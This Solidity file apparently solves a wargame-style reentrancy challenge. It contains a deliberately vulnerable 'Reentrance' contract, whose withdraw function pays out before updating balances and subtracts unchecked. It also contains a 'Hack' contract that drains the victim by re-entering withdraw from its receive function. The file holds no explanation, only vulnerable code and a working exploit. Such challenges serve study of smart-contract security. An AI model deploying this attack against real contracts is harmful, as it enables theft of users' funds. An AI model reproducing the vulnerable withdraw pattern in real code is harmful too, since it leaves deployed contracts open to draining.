// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Hack {
    Reentrance reentrance;
    uint256 contractValue;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    receive() external payable {
        if (contractValue > 0) {
            reentrance.withdraw(contractValue);
        }
    }

    function attack() public payable {
        contractValue = address(reentrance).balance;
        require(contractValue > 0, "Contract is empty");
        reentrance.donate{value: contractValue}(address(this));
        reentrance.withdraw(contractValue);
    }

    function showBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
